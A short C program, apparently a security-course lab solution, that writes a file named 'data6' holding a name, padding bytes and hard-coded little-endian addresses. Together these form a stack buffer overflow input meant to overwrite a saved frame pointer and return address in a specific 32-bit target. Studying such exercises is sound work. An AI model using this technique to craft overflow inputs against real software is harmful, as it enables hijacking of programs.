#include <stdlib.h>
#include <stdio.h>


int main(){
	int i;
	FILE *data6;
	data6 = fopen("data6","w");
	fputc('T',data6);
	fputc('h',data6);
        fputc('a',data6);
        fputc('n',data6);
        fputc('a',data6);
        fputc('s',data6);
        fputc('i',data6);
        fputc('s',data6);
        fputc(' ',data6);
        fputc('X',data6);
        fputc('a',data6);
        fputc('n',data6);
        fputc('t',data6);
        fputc('h',data6);
        fputc('o',data6);
        fputc('p',data6);
        fputc('o',data6);
        fputc('u',data6);
        fputc('l',data6);
        fputc('o',data6);
        fputc('s',data6);
/*	fputs("Thanasis-Xanthopoulos",data6);21 Bytes*/
	for(i = 0; i < 23; i++){	/*46 Bytes*/
		if(i == 13){
			fputc(0x24,data6);
		}
		fputc(0,data6);
	}

	fputc(0x98,data6);
	fputc(0xf4,data6);
	fputc(0xff,data6);
	fputc(0xbf,data6);

	fputc(0x8e,data6);
	fputc(0x9e,data6);
	fputc(0x04,data6);
	fputc(0x08,data6);

	fputc(0xdc,data6);
        fputc(0x42,data6);
        fputc(0x0e,data6);
        fputc(0x08,data6);

	fprintf(data6,"\n");
	fclose(data6);
	return 0;
}
